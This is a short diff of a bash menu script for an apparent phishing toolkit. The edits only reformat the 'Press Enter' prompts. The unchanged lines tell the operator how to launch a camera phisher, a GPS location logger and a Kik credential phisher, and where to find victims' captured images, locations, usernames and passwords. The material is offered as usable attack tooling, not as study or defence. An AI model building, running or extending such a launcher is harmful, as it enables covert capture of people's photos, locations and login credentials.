@@ -31,20 +31,20 @@ case $choice in
         # Display a message and wait for user to press Enter
         echo -e "                                                                                                      ${RED}Start camphisher by saying cd tools/phishers and then bash camphish.sh${NC}"
         echo -e "                                                                                                      ${RED}Find the victims' imgs in cd tools/phishers/imgs${NC}"
-        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
+        read -p "                                                                                                            Press [Enter] to return to the menu or exit...   "
         ;;
     2)
         # Display a message and wait for user to press Enter
         echo -e "                                                                                                      ${RED}Start GPS pin pointer by saying cd tools/phishers and then bash gps.sh${NC}"
         echo -e "                                                                                                      ${RED}Find the victims' logs in cd tools/phishers/ and then open logs.txt${NC}"
-        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
+        read -p "                                                                                                            Press [Enter] to return to the menu or exit..."
         ;;
 
     3)
         # Display a message and wait for user to press Enter
         echo -e "                                                                                                      ${RED}Start Kik Phisher by saying cd tools/phishers and then bash kikphish.sh${NC}"
         echo -e "                                                                                                      ${RED}Find the victim's user and password in cd tools/phishers/ and then open saved.txt${NC}"
-        read -p "                                                                                                      ${RED}Press [Enter] to return to the menu or exit...${NC}"
+        read -p "                                                                                                            Press [Enter] to return to the menu or exit..."
         ;;
         
     0)
